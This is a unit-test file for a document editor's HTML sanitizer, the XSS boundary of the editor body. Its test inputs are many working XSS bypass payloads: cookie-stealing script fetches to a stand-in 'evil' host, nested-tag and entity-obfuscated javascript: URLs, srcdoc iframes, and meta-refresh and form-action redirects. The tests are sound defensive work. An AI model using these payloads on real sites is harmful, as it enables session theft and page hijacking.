// Unit tests for the document-HTML sanitizer (the XSS trust boundary for the
// Word-editor body). Run:
//   node --experimental-strip-types --experimental-loader ./scripts/ts-ext-hook.mjs scripts/sanitize-html.test.ts
import { sanitizeDocHtml, isUnsafeDocHtml } from "../src/lib/sanitize-html.ts";

let pass = 0, fail = 0;
const ok = (name: string, cond: boolean, info = "") => {
  if (cond) pass++;
  else { fail++; console.error("✗ " + name + (info ? ` — ${info}` : "")); }
};
const has = (h: string, s: string) => h.includes(s);
const gone = (h: string, s: string) => !h.toLowerCase().includes(s.toLowerCase());

// ── strips active content ─────────────────────────────────────────────────────
ok("removes <script> blocks and their content",
  gone(sanitizeDocHtml(`<p>hi</p><script>fetch('//evil?'+document.cookie)</script>`), "fetch"));
ok("removes onerror handler on img",
  gone(sanitizeDocHtml(`<img src=x onerror="alert(document.cookie)">`), "onerror"));
ok("removes onload on svg",
  gone(sanitizeDocHtml(`<svg onload=alert(1)></svg>`), "onload"));
ok("removes onclick with single quotes",
  gone(sanitizeDocHtml(`<div onclick='steal()'>x</div>`), "onclick"));
ok("removes onmouseover with unquoted value",
  gone(sanitizeDocHtml(`<a onmouseover=go()>x</a>`), "onmouseover"));
ok("neutralizes javascript: href",
  gone(sanitizeDocHtml(`<a href="javascript:alert(1)">x</a>`), "javascript:"));
ok("neutralizes vbscript: src",
  gone(sanitizeDocHtml(`<img src="vbscript:msgbox">`), "vbscript:"));
ok("defangs data:text/html",
  gone(sanitizeDocHtml(`<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`), "text/html"));
ok("removes <iframe>",
  gone(sanitizeDocHtml(`<iframe src="//evil"></iframe>`), "<iframe"));
ok("removes <object> and <embed>",
  gone(sanitizeDocHtml(`<object data="x"></object><embed src="y">`), "<object") &&
  gone(sanitizeDocHtml(`<embed src="y">`), "<embed"));

// ── handler-separator bypasses: `/` and closing-quote are attribute separators ───
ok("removes onload after a slash separator (<svg/onload=…>)",
  gone(sanitizeDocHtml(`<svg/onload=alert(1)>`), "onload"));
ok("removes onerror abutting a closing quote (<img src=\"x\"onerror=…>)",
  gone(sanitizeDocHtml(`<img src="x"onerror=alert(1)>`), "onerror"));
ok("removes onerror after a slash before other attrs (<img/onerror=… src=x>)",
  gone(sanitizeDocHtml(`<img/onerror=alert(1) src=x>`), "onerror"));
ok("removes chained handlers (<img/onload=a/onerror=b>)",
  gone(sanitizeDocHtml(`<img/onload=a()/onerror=b()>`), "onload") &&
  gone(sanitizeDocHtml(`<img/onload=a()/onerror=b()>`), "onerror"));
ok("slash-separated handler does not eat a real attribute's quote",
  has(sanitizeDocHtml(`<img src="/brand/x.png"onerror=alert(1)>`), 'src="/brand/x.png"'));

// ── URL scheme bypasses via HTML-entity / control-char obfuscation ──────────────
// (round 9 review 4: a link to an address that may not be one is no link — its words kept, never «#»)
ok("neutralizes entity-encoded javascript: (&#106;avascript:)",
  sanitizeDocHtml(`<a href="&#106;avascript:alert(1)">x</a>`) === "x");
ok("neutralizes tab-obfuscated javascript: (jav&#9;ascript:)",
  sanitizeDocHtml(`<a href="jav&#9;ascript:alert(1)">x</a>`) === "x");
ok("neutralizes hex-entity javascript: (&#x6a;avascript:)",
  sanitizeDocHtml(`<a href="&#x6a;avascript:alert(1)">x</a>`) === "x");
ok("drops a data:text/html src entirely (not an image)",
  gone(sanitizeDocHtml(`<img src="data:text/html,<script>bad</script>">`), "text/html"));
ok("unlinks a data: href (navigable → never allowed)",
  sanitizeDocHtml(`<a href="data:image/svg+xml,<svg onload=1>">x</a>`) === "x");

// ── the URL allow-list keeps every legitimate value untouched ───────────────────
ok("keeps a relative href; a link to a place in this page (its ids are not kept) is no link", sanitizeDocHtml(`<a href="#top">t</a>`) === "t" &&
  has(sanitizeDocHtml(`<a href="/apply">a</a>`), 'href="/apply"'));
ok("keeps tel: links", has(sanitizeDocHtml(`<a href="tel:+35921234">c</a>`), "tel:+35921234"));

// ── keeps legitimate formatting ───────────────────────────────────────────────
const rich = `<h2 class="sec">Раздел</h2><p style="color:#9e2b2b">текст <strong>bold</strong></p>` +
  `<table class="ptable"><tr><td>a</td><td>b</td></tr></table><ul><li>x</li></ul>`;
ok("keeps headings/paragraphs/strong", has(sanitizeDocHtml(rich), "<strong>bold</strong>"));
ok("keeps style attribute (formatting)", has(sanitizeDocHtml(rich), 'style="color:#9e2b2b"'));
ok("keeps tables", has(sanitizeDocHtml(rich), '<table class="ptable">'));
ok("keeps Cyrillic content intact", has(sanitizeDocHtml(rich), "Раздел"));
ok("keeps http links", has(sanitizeDocHtml(`<a href="https://ptsbg.eu">site</a>`), 'href="https://ptsbg.eu"'));
ok("keeps mailto links", has(sanitizeDocHtml(`<a href="mailto:x@y.bg">m</a>`), "mailto:x@y.bg"));
ok("keeps data:image base64 (inline images)",
  has(sanitizeDocHtml(`<img src="data:image/png;base64,iVBORw0KGgo=">`), "data:image/png;base64,iVBORw0KGgo="));
// part 1.12: a picture only from the portal's own places — its storage, ptsbg.eu
process.env.NEXT_PUBLIC_SUPABASE_URL = "https://x.supabase.co";
ok("keeps the portal's uploaded photos (its own storage)",
  has(sanitizeDocHtml(`<img src="https://x.supabase.co/storage/v1/object/public/skin-assets/a.png" style="width:60mm">`), "https://x.supabase.co/storage/v1/object/public/skin-assets/a.png"));
ok("drops a picture from anywhere else (a viewer's browser is never sent there)",
  !has(sanitizeDocHtml(`<img src="https://tracker.example.net/p.gif">`), "tracker.example.net"));
delete process.env.NEXT_PUBLIC_SUPABASE_URL;
ok("preserves HTML comment markers (BODY/COVER)",
  has(sanitizeDocHtml(`<!--PTS:CV-->\n<p>x</p>`), "<!--PTS:CV-->"));

// ── editor formulas (MathML) + tick marks must round-trip untouched ─────────────
const formula = `<span class="we-f" contenteditable="false" data-f="z = (x_i − x_pt) / σ_pt"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi>z</mi><mo>=</mo><mfrac><mrow><mi>x</mi></mrow><mrow><mi>σ</mi></mrow></mfrac></mrow></math></span>`;
ok("keeps inserted formulas (MathML) verbatim", sanitizeDocHtml(formula) === formula);
const ticks = `<p><span class="ff-opt"><span class="ff-box on">✓</span><span>Опция</span></span> <span class="ff-opt"><span class="ff-rb on">●</span><span>Да</span></span></p>`;
ok("keeps toggled tickboxes/radios verbatim", sanitizeDocHtml(ticks) === ticks);

// ── the property that matters: sanitize is idempotent + flags unsafe input ──────
const dirty = `<p>ok</p><img src=x onerror=alert(1)><script>bad()</script>`;
const once = sanitizeDocHtml(dirty);
ok("idempotent (second pass is a no-op)", sanitizeDocHtml(once) === once);
ok("clean input is unchanged", sanitizeDocHtml(rich) === rich, "sanitizer must not rewrite safe HTML");
ok("isUnsafeDocHtml true for handler", isUnsafeDocHtml(dirty));
ok("isUnsafeDocHtml false for clean", !isUnsafeDocHtml(rich));
ok("empty/nullish safe", sanitizeDocHtml("") === "" && sanitizeDocHtml(null) === "" && sanitizeDocHtml(undefined) === "");

// ── the security sweep (SI-1): nested and unclosed tags, an iframe's inline document ────────
// what a browser would read as live: only inside a tag (text never carries a «<» that starts one)
const tagsOf = (h: string) => h.match(/<[a-zA-Z][^>]*>?/g) ?? [];
const live = (h: string) => tagsOf(h).some((t) => /^<\s*(script|iframe|object|embed|frame|base|meta|form)\b/i.test(t) || /\bsrcdoc\s*=/i.test(t) || /[\s/"']on[a-z]+\s*=/i.test(t));
for (const payload of [
  `<scr<script>ipt>alert(1)</scr<script>ipt>`,
  `<ifr<script>ame srcdoc="&lt;script&gt;parent.x=1&lt;/script&gt;"></iframe>`,
  `<ifr<scr<scr<script>ipt>ipt>ame style="display:none" srcdoc="&lt;script&gt;x()&lt;/script&gt;">`,
  `<p>ok</p><iframe srcdoc="&lt;script&gt;x()&lt;/script&gt;"`,
  `<p>ok</p><scr<script>ipt src=//evil.example/x.js></scr<script>ipt>`,
  `<sc<style>x</style>ript>alert(1)</script>`,
  `<im<script>g src=x onerror=alert(1)>`,
  `<img src=x on<script>error=alert(1)>`,
  `<a href="javas<script>cript:alert(1)">x</a>`,
  `<div srcdoc="&lt;script&gt;x()&lt;/script&gt;">x</div>`,
  `<button formaction="javascript:alert(1)">x</button>`,
  `<object data="x"`,
]) {
  const once = sanitizeDocHtml(payload);
  ok(`nothing live survives: ${payload.slice(0, 50)}`, !live(once) && !tagsOf(once).some((t) => /javascript:/i.test(t)), once);
  ok(`…and sanitizing again changes nothing (a fixed point): ${payload.slice(0, 40)}`, sanitizeDocHtml(once) === once, sanitizeDocHtml(once));
  // what the print shell does: wrap and close — an unclosed tag must not be closed into life
  ok(`…nor once wrapped in the print shell: ${payload.slice(0, 40)}`, !live(`<div>${once}</div>`), once);
}
ok("a document's own formatting is kept as it was (round 9: a class not of the documents dropped; a link opens a new tab)",
  sanitizeDocHtml(`<!-- BODY --><h1 class="t">Заглавие</h1><p style="text-align:center">Текст <b>удебелен</b> <a href="https://ptsbg.eu">връзка</a></p><table><tr><td colspan="2">x</td></tr></table>`)
    === `<!-- BODY --><h1>Заглавие</h1><p style="text-align:center">Текст <b>удебелен</b> <a href="https://ptsbg.eu" target="_blank" rel="noopener noreferrer">връзка</a></p><table><tr><td colspan="2">x</td></tr></table>`);
// round 2 (R2S-1, R2S-2, R2S-8, R2S-10): the portal's markers inside a tag, a script's scheme in any
// attribute, SVG's animation, pictures from anywhere, and a linear pass
for (const payload of [
  `<scr<!--PTS:BS-->ipt>alert(1)</scr<!--PTS:BS-->ipt>`,
  `<me<!--PTS:BE-->ta http-equiv=refresh content="0;url=https://evil.example">`,
  `<fo<!--PTS:BS-->rm action=https://evil.example><input name=p></fo<!--PTS:BS-->rm>`,
  `<img src=x on<!--PTS:BS-->error=alert(1)>`,
  `<a href="java<!--PTS:BS-->script:alert(1)">x</a>`,
  `<a x=href="a href=&#106;avascript:alert(1)//">c</a>`,
  `<svg><a><animate attributeName=href values=&#106;avascript:alert(1) /><text>x</text></a></svg>`,
  `<svg><a><set attributeName=href to=javascript:alert(1) /><text>x</text></a></svg>`,
]) {
  const once = sanitizeDocHtml(payload);
  const shell = (once.split("<!--PTS:BS-->").join("").split("<!--PTS:BE-->").join(""));
  ok(`round 2 — nothing live, even once the shell's markers are removed: ${payload.slice(0, 44)}`, !live(once) && !live(shell) && !/javascript:|<meta|<form|<animate|<set\b/i.test(shell), shell);
}
ok("round 2 — a cover's mark between tags is kept", sanitizeDocHtml(`<!--PTS:CV-->\n<p>x</p>`) === `<!--PTS:CV-->\n<p>x</p>`);
for (const [name, html] of [["srcset", `<img srcset="https://evil.example/x.png 1x">`], ["background", `<td background="https://evil.example/x.png">x</td>`], ["poster", `<video poster="https://evil.example/p.png"></video>`], ["a style's url()", `<p style="background:url(https://evil.example/s.png)">x</p>`], ["a backslash", `<img src="\\evil.example/x.png">`], ["a portal page", `<img src="/lab/doc/S/report">`], ["a relative page", `<img src="report">`]] as const) {
  ok(`round 2 — no picture from ${name}`, !/evil\.example|\/lab\/doc|src="report"/.test(sanitizeDocHtml(html)), sanitizeDocHtml(html));
}
ok("round 2 — the portal's own pictures kept", sanitizeDocHtml(`<img src="/brand/logo.png"><img src="data:image/png;base64,AAAA">`) === `<img src="/brand/logo.png"><img src="data:image/png;base64,AAAA">`);
{
  const t0 = Date.now(); sanitizeDocHtml("<style>".repeat(120_000)); sanitizeDocHtml("<script ".repeat(60_000));
  ok("round 2 — a pathological body is handled in linear time", Date.now() - t0 < 2000, `${Date.now() - t0} ms`);
}

// round 3 (R3S-1/2/3): the body read as a browser reads it — a «>» inside quotes, a tag cut off at
// the end, the first of two same-named attributes, pictures resolved as the browser resolves them,
// CSS decoded before it is judged, and linear time on every shape
{
  const JE = "&#106;avascript:alert(1)";
  const inTags = (h: string, re: RegExp) => tagsOf(h).some((t) => re.test(t.replace(/&#106;/g, "j")));
  for (const [name, html] of [
    ["a «>» inside quotes hides nothing", `<a title=">" x=href="a href=${JE}//">click</a>`],
    ["…single quotes too", `<a title='>' x=href='a href=${JE}//'>click</a>`],
    ["a tag cut off at the end is dropped", `<p>x</p><a x=href="a href=${JE}//"`],
    ["SVG's xlink link, misread", `<svg><a title=">" x=xlink:href="a xlink:href=${JE}//"><text y="20">t</text></a></svg>`],
    ["the second of two hrefs is not the one checked", `<a href="#ok" href="${JE}">c</a>`],
  ] as const) {
    const out = sanitizeDocHtml(html);
    ok(`round 3 — ${name}`, !inTags(out, /javascript:/i), out);
  }
  ok("round 3 — the first of two same-named attributes is the one kept", sanitizeDocHtml(`<a href="/ok" href="${JE}">c</a>`) === `<a href="/ok" target="_blank" rel="noopener noreferrer">c</a>`);
  for (const [name, html] of [
    ["/brand/ then «..»", `<img src="/brand/../lab/doc/S/report">`],
    ["/brand/ then %2e%2e", `<img src="/brand/%2e%2e/lab/doc/S/report">`],
    ["/brand/ then «..\\»", `<img src="/brand/..\\lab/doc/S/report">`],
    ["/brand/ then «.&#9;.»", `<img src="/brand/.&#9;./lab/doc/S/report">`],
    ["an SVG image's href", `<svg><image href="/schemes/S/export"/></svg>`],
    ["an SVG image's xlink:href", `<svg><image xlink:href="/schemes/S/audit-pack"/></svg>`],
    ["feImage", `<svg><filter id=f><feImage href="/lab/doc/S/report"/></filter></svg>`],
    ["a misread «x=src»", `<img x=src="/brand/ src=/schemes/S/audit-pack">`],
    ["a style's image-set()", `<p style="background-image:image-set('/lab/doc/S/report' 1x)">x</p>`],
    ["a style's escaped url()", `<p style="background:u\\72l(/lab/doc/S/report)">x</p>`],
    ["a style's url&#40;", `<p style="background:url&#40;/lab/doc/S/report)">x</p>`],
    ["a style after a «>» in quotes", `<p title=">" style="background:url(/lab/doc/S/report)">x</p>`],
    ["an SVG fill", `<svg><rect fill="url(/lab/doc/S/report#p)"/></svg>`],
    ["an input's picture", `<input type=image src="/lab/doc/S/report">`],
  ] as const) {
    const out = sanitizeDocHtml(html);
    ok(`round 3 — no portal page as a picture: ${name}`, !inTags(out, /\/lab\/|\/schemes\//), out);
  }
  ok("round 9 — a style never loads a picture, not even the portal's own; an SVG never <use>s another element (not on the lists)",
    sanitizeDocHtml(`<p style="background-image:url('/brand/embroidery-border.png')">e</p><svg><use href="#m"/></svg>`) === `<p>e</p><svg></svg>`);
  ok("round 3 — «ΔM < 0.1 %» stays as written", sanitizeDocHtml(`<p>ΔM < 0.1 %</p>`) === `<p>ΔM < 0.1 %</p>`);
  ok("round 3 — a «<» a dropped tag would join to what follows is escaped", !/<script/i.test(sanitizeDocHtml(`a<<x!>script>alert(1)`)), sanitizeDocHtml(`a<<x!>script>alert(1)`));
  ok("round 3 — a button never reaches the editor page's own forms or popovers (round 9: no button in a document at all)",
    sanitizeDocHtml(`<button form="f" formmethod="post" popovertarget="p" commandfor="d" command="show-modal">b</button>`) === `b`);
  // the portal on a ptsbg.eu name: its own pages are no picture, its /brand/ is; the website's are
  process.env.NEXT_PUBLIC_SITE_URL = "https://portal.ptsbg.eu";
  ok("round 3 — the portal's own address: a page is no picture", !/schemes/.test(sanitizeDocHtml(`<img src="https://portal.ptsbg.eu/schemes/S/export">`)));
  ok("round 3 — …its /brand/ (as its path — round 4) and the website's pictures are", sanitizeDocHtml(`<img src="https://portal.ptsbg.eu/brand/logo.png"><img src="https://ptsbg.eu/x.jpg">`) === `<img src="/brand/logo.png"><img src="https://ptsbg.eu/x.jpg">`);
  delete process.env.NEXT_PUBLIC_SITE_URL;
  const t0 = Date.now();
  sanitizeDocHtml("<a ".repeat(70_000)); sanitizeDocHtml(`<p style="` + "url(".repeat(50_000) + `">x</p>`); sanitizeDocHtml(`<img src="` + " ".repeat(200_000) + `x">`);
  sanitizeDocHtml("<!--".repeat(50_000)); sanitizeDocHtml(`<a href="` + "&amp".repeat(50_000) + `">`);
  ok("round 3 — every pathological shape in linear time", Date.now() - t0 < 1500, `${Date.now() - t0} ms`);
}

// round 4 (R4S-1/2/3/5/8, R4U-3/9): «https:/host» is relative to an https page; an allow-list of attributes;
// comments in one scan; no picture names the page's own document; no «rel=opener»; a pasted portal picture kept
{
  const inTags = (h: string, re: RegExp) => tagsOf(h).some((t) => re.test(t));
  for (const [name, html] of [
    ["«https:/ptsbg.eu/../»", `<img src="https:/ptsbg.eu/../schemes/S1/export">`],
    ["«https:ptsbg.eu»", `<img src="https:ptsbg.eu/../../../../schemes/S1/export">`],
    ["«https:\\ptsbg.eu\\..»", `<img src="https:\\ptsbg.eu\\..\\schemes">`],
    ["entities", `<img src="https&colon;/ptsbg&period;eu/&period;&period;/schemes/S1/export">`],
    ["a video's poster", `<video poster="https:/ptsbg.eu/../schemes/S1/export"></video>`],
    ["an SVG image", `<svg><image href="https:/ptsbg.eu/../schemes/S1/export"/></svg>`],
    ["a style", `<p style="background:url(https:/ptsbg.eu/../schemes/S1/export)">x</p>`],
    ["«../brand/» from a deeper page", `<img src="../brand/print">`],
    ["«/brand/./»", `<img src="/brand/./../schemes/x">`],
  ] as const) {
    const out = sanitizeDocHtml(html);
    ok(`round 4 — no portal page as a picture: ${name}`, !inTags(out, /schemes|print/), out);
  }
  for (const a of ["attributionsrc", "ping", "srcset", "sharedstoragewritable", "popovertarget", "formaction", "onfocus"]) {
    ok(`round 4 — an attribute not on the list is dropped: ${a}`, !new RegExp(a, "i").test(sanitizeDocHtml(`<img src="/brand/logo.png" ${a}="/schemes/S1/export"><a href="/x" ${a}="/schemes/S1/export">l</a>`)));
  }
  ok("round 4 — a picture names nothing on the editor page's own document", sanitizeDocHtml(`<img name="createElement" src="/brand/logo.png">`) === `<img src="/brand/logo.png">`);
  ok("round 4 — …a form field keeps its name", sanitizeDocHtml(`<input type="checkbox" name="a" checked>`) === `<input type="checkbox" name="a" checked>`);
  ok("round 4 / round 9 — no link keeps its own «rel» or «target»: every one opens a new tab without an opener", sanitizeDocHtml(`<a href="https://x.example" target="_blank" rel="opener">a</a><a href="https://x.example" target="_blank" rel="noopener">b</a>`) === `<a href="https://x.example" target="_blank" rel="noopener noreferrer">a</a><a href="https://x.example" target="_blank" rel="noopener noreferrer">b</a>`);
  ok("round 9 — no SVG gradient, «url(#…)» fill or MathML «form» (the documents' icons and lib/formula use none)", sanitizeDocHtml(`<svg><defs><linearGradient id="g1"><stop offset="0" stop-color="red"/></linearGradient></defs><rect fill="url(#g1)" width="10" height="10"/></svg><math><mo form="prefix">−</mo></math>`) === `<svg><rect width="10" height="10"/></svg><math><mo>−</mo></math>`);
  ok("round 4 — a pasted style loses only what loads from elsewhere", sanitizeDocHtml(`<p style="color:red;background:url(https://evil.example/x.png);width:50%">x</p>`) === `<p style="color:red;width:50%">x</p>`, sanitizeDocHtml(`<p style="color:red;background:url(https://evil.example/x.png);width:50%">x</p>`));
  ok("round 4 — a picture from nowhere it may come from leaves no empty box", sanitizeDocHtml(`<p>a<img src="file:///C:/x.png" style="width:60mm">b</p>`) === `<p>ab</p>`);
  ok("round 4 — sms:, viber: and ftp: links kept", !/#/.test(sanitizeDocHtml(`<a href="sms:+359">s</a><a href="viber://chat?number=1">v</a><a href="ftp://ptsbg.eu/f">f</a>`)));
  (globalThis as { location?: unknown }).location = { origin: "https://pts-portal.vercel.app", host: "pts-portal.vercel.app" };
  ok("round 4 — a portal picture copied inside the editor (written whole) is kept, as its path", sanitizeDocHtml(`<img src="https://pts-portal.vercel.app/brand/team-data.png">`) === `<img src="/brand/team-data.png">`);
  ok("round 4 — …another portal page copied so is not", sanitizeDocHtml(`<img src="https://pts-portal.vercel.app/schemes/S/export">`) === ``);
  delete (globalThis as { location?: unknown }).location;
  const t0 = Date.now();
  sanitizeDocHtml("<!--x-->".repeat(40_000)); sanitizeDocHtml("<p>a</p><!--x-->".repeat(30_000)); sanitizeDocHtml("<!--x--!>".repeat(40_000));
  ok("round 4 — many comments in linear time", Date.now() - t0 < 1500, `${Date.now() - t0} ms`);
}

// round 5 (R5SA-2/3/4/9/10): a form's text field kept as the browser reads it; a named window, a pinned
// overlay, a password field never; a rebuilt style keeps its characters
{
  ok("round 5 — a form's text field kept, its text as text", sanitizeDocHtml(`<p>q6</p><textarea name="q6" rows="3">made-up remark &amp; more</textarea>`) === `<p>q6</p><textarea name="q6" rows="3">made-up remark &amp; more</textarea>`);
  const tx = sanitizeDocHtml(`<textarea><p title="</textarea><img src=x onerror=alert(1)>">`);
  ok("round 5 — …nothing hidden in it comes alive", !tagsOf(tx).some((t) => /onerror|<img/i.test(t)) && tx.startsWith("<textarea>&lt;p"), tx);
  ok("round 5 — …inside SVG too", !/<b>/.test(sanitizeDocHtml(`<svg><textarea>a<b>b</b></textarea></svg>`)));
  ok("round 5 — a link opens only a new tab (never a named window that keeps its opener)", sanitizeDocHtml(`<a href="https://x.example" target="w1">a</a><a href="https://x.example" target="_blank">b</a>`) === `<a href="https://x.example" target="_blank" rel="noopener noreferrer">a</a><a href="https://x.example" target="_blank" rel="noopener noreferrer">b</a>`);
  for (const css of ["position:fixed;top:0;width:100vw", "posit\\69 on: fixed", "position:/**/sticky", "position: -webkit-sticky"]) {
    ok(`round 5 — nothing pinned over the screen: ${css}`, !/fixed|sticky/i.test(sanitizeDocHtml(`<a href="https://x.example" style="${css};color:red">x</a>`).replace(/<[^>]*href[^>]*>/, (t) => t.replace(/href="[^"]*"/, ""))), sanitizeDocHtml(`<a href="https://x.example" style="${css};color:red">x</a>`));
  }
  ok("round 9 — no inline «position» anywhere (a free picture gets it from its class «free»)", sanitizeDocHtml(`<p style="position:absolute;left:3mm">y</p>`) === `<p>y</p>`);
  ok("round 5 — no password field; the builder's fields kept", sanitizeDocHtml(`<input type="password" name="pwd"><input type="checkbox" name="a" checked>`) === `<input name="pwd"><input type="checkbox" name="a" checked>`);
  ok("round 5 — a rebuilt style keeps «é» (round 9: «content» is no property of a document)", sanitizeDocHtml(`<p style="font-family:Caf&eacute;;background:url(//e)">x</p><p style="color:red;background:url(//e);content:&#x80;">y</p>`) === `<p style="font-family:Café">x</p><p style="color:red">y</p>`);
}

// round 9 review 4: the independent review of the allow-list cleaner (its 12 findings, one check each, at least)
{
  const S = sanitizeDocHtml;
  const LT = ` target="_blank" rel="noopener noreferrer"`;
  // 1 — what is left open at the end is closed there: nothing carries on into the page's footer
  ok("review 4 / 1 — a link left open is closed with its paragraph", S(`<p>Hello <a href="https://e.example/">x`) === `<p>Hello <a href="https://e.example/"${LT}>x</a></p>`, S(`<p>Hello <a href="https://e.example/">x`));
  ok("review 4 / 1 — …a dropdown, a cell, a table", S(`<p>T</p><select name="x"><option>a</option>`) === `<p>T</p><select name="x"><option>a</option></select>` && S(`<table><tr><td style="color:#fff;font-size:4pt">x`) === `<table><tr><td style="color:#fff;font-size:4pt">x</td></tr></table>`);
  ok("review 4 / 1 — …bold in a paragraph, and bold the browser carries on past the paragraph it closed", S(`<p><b style="color:#fff;font-size:4pt">x`) === `<p><b style="color:#fff;font-size:4pt">x</b></p>` && S(`<p><b>x</p><p>y`) === `<p><b>x</p><p>y</p></b>`, S(`<p><b>x</p><p>y`));
  ok("review 4 / 1 — …on every way out: a comment, a tag, a script cut off at the end", S(`<p><i>x<!-- never ends`) === `<p><i>x</i></p>` && S(`<ul><li><u>x<a href="https://e.example/"`) === `<ul><li><u>x</u></li></ul>` && S(`<div><s>x<script>y`) === `<div><s>x</s></div>`);
  ok("review 4 / 1 — …a formula and a drawing", S(`<math><mrow><mi>x`) === `<math><mrow><mi>x</mi></mrow></math>` && S(`<svg><g><path d="M0 0"/>`) === `<svg><g><path d="M0 0"/></g></svg>`);
  ok("review 4 / 1 — a drawing closed by its own «/>» stays closed when rewritten (it opened, and took what followed)", S(`<svg class="x" width="10"/><p>a</p>`) === `<svg width="10"/><p>a</p>`);
  // 2 — linear: a box of a fixed size is a box (never nested deeper than 100); a rowspan as written out (≤ 1000)
  {
    const fit = (a: string, b: string) => { const k = Math.floor(3e6 / (a.length + b.length)); return a.repeat(k) + b.repeat(k); };
    const shapes: [string, string][] = [["tick boxes under «</div>»", fit('<span class="ff-box">', "</div>")], ["bars under «</li>»", fit('<span class="bar">', "</li>")], ["tab stops under «<td>»", fit('<span class="we-tab">', "<td>")], ["rows of rowspan=9999", "<table>" + "<tr><td rowspan=9999>x".repeat(Math.floor(3e6 / 22))]];
    for (const [name, h] of shapes) {
      const t0 = Date.now(), o = S(h), t1 = Date.now(); S(o); const t2 = Date.now();
      ok(`review 4 / 2 — 3 MB of ${name}: saved in under a second, and shown again in under a second`, t1 - t0 < 1000 && t2 - t1 < 1000, `${t1 - t0} ms, ${t2 - t1} ms`);
    }
  }
  ok("review 4 / 2 — a rowspan past 1000 is 1000 in the room it takes (it was 1 inside, 1000 written: no fixed point, the body escaped)",
    S(`<table><tr><td rowspan="99999" style="width:100mm">a</td><td>b</td></tr><tr><td style="width:100mm">c</td></tr></table>`) === `<table><tr><td rowspan="1000" style="width:100mm">a</td><td>b</td></tr><tr><td style="width:60.86mm">c</td></tr></table>`);
  // 3 — a formula's letter holds text only
  ok("review 4 / 3 — nothing opens inside a formula's letter, number or operator", S(`<math><mi><mrow>x</mi></math><p>after</p>`) === `<math><mi>x</mi></math><p>after</p>` && S(`<p>See <math><mi><mi>x</mi></mi></math> then</p>`) === `<p>See <math><mi>x</mi></math> then</p>`);
  // 4 — a table's row and cell keep their height
  const rows = `<table border="1"><tr style="height:40pt"><td style="height:30mm;width:50mm">Sign here</td></tr></table>`;
  ok("review 4 / 4 — Word's row and cell heights kept (a min-height there is ignored)", S(rows) === rows, S(rows));
  ok("review 4 / 4 — …a block's height still a minimum when it holds words", S(`<div style="height:10mm">x</div>`) === `<div style="min-height:10mm">x</div>`);
  // 6 — a box no document has is a box, never nothing
  ok("review 4 / 6 — sections, a centre, a definition list: boxes (never «T-42. Scope»)", S(`<section>T-4</section><section>2. Scope</section>`) === `<div>T-4</div><div>2. Scope</div>` && S(`<center>c</center><dl><dt>Term</dt><dd>Def</dd></dl>`) === `<div style="text-align:center">c</div><div><div>Term</div><div>Def</div></div>`);
  ok("review 4 / 6 — …closed as written: «</section>» over a <div> inside it", S(`<section><div>x</section>y`) === `<div><div>x</div></div>y` && S(`<div><section><p>a</div>b`) === `<div><div><p>a</p></div></div>b`);
  ok("review 4 / 6 — a rule and preformatted text, plain", S(`<p>a</p><hr style="height:900px" class="bar"><pre style="width:900mm">  code\n    indented</pre>`) === `<p>a</p><hr><pre>  code\n    indented</pre>`);
  ok("review 4 / 6 — LibreOffice's <font>: a span of its colour, face and size (its own style wins); a stray </font> closes nothing",
    S(`<p><font face="Arial" color="red" size="5">a</font> <font size="+1" style="font-size:9pt">b</font></font></p>`) === `<p><span style="color:red;font-family:Arial;font-size:18pt">a</span> <span style="font-size:13.5pt;font-size:9pt">b</span></p>`, S(`<p><font face="Arial" color="red" size="5">a</font> <font size="+1" style="font-size:9pt">b</font></font></p>`));
  // 7 — no right-to-left box (it turned a negative indent outwards)
  ok("review 4 / 7 — no «dir»", S(`<p dir="rtl" style="margin-left:120mm;text-indent:-120mm">x</p>`) === `<p style="margin-left:120mm;text-indent:-120mm">x</p>`);
  ok("review 4 / 7 — a first line indented 20 mm at most (a column-wide drawing after it left the sheet); Word's 1.25 cm kept",
    S(`<fieldset style="text-indent:100.0px"><svg height="5000"></svg></fieldset>`) === `<div style="text-indent:20mm"><svg height="1000" width="608"></svg></div>` && S(`<p style="text-indent:35.4pt">x</p>`) === `<p style="text-indent:35.4pt">x</p>`);
  // 8 — a picture's margins fit beside it; a free picture has none
  ok("review 4 / 8 — a picture's side margins that would not fit beside it are reduced to the room it leaves; ones that fit are kept",
    S(`<p><img src="/brand/logo.png" alt="" style="width:100mm;margin-left:100mm"></p>`) === `<p><img src="/brand/logo.png" alt="" style="width:100mm;margin-left:60.86mm;margin-right:0mm"></p>` &&
    S(`<p><img src="/brand/logo.png" alt="" style="float:right;margin:4px 0 8px 12px;width:30mm"></p>`) === `<p><img src="/brand/logo.png" alt="" style="float:right;margin:4px 0 8px 12px;width:30mm"></p>`);
  ok("review 4 / 8 — …and a free one none", S(`<img class="free" src="/brand/logo.png" style="left:100mm;top:0mm;width:80mm;margin-left:120mm">`) === `<img src="/brand/logo.png" class="free" style="left:100mm;top:0mm;width:80mm">`);
  // 9 — a CSS string not closed is no value (what the cleaner writes after it would be read inside it)
  ok("review 4 / 9 — an unclosed string drops its declaration: the width the cleaner writes after it stays a width (the body was escaped whole)", S(`<p style="font-family:'Arial">x</p><div style="width:150mm;margin-left:20mm;font-family:'A">y</div>`) === `<p>x</p><div style="margin-left:20mm;width:140.86mm">y</div>`);
  // 10 — a link a reader cannot see is no link; a run of blanks in one is one space
  ok("review 4 / 10 — a link of Braille blanks, Hangul fillers or em spaces only is no link", !/<a /.test(S(`<p><a href="https://e.example/">${"&#10240;".repeat(30)}</a><a href="https://e.example/">${"\u3164".repeat(30)}</a><a href="https://e.example/">${"&emsp;".repeat(30)}&zwj;</a></p>`)));
  ok("review 4 / 10 — …a run of blanks however written is one space; words and references kept", S(`<p><a href="https://e.example/">.${"&emsp;&ThinSpace;\u2800&#8195; ".repeat(500)}.</a> <a href="https://e.example/">R&amp;D &mdash; x&zwj;y</a></p>`) === `<p><a href="https://e.example/"${LT}>. .</a> <a href="https://e.example/"${LT}>R&amp;D &mdash; x\u200dy</a></p>`);
  // 11 — a free picture a little out of range is moved into it, not dropped from its place
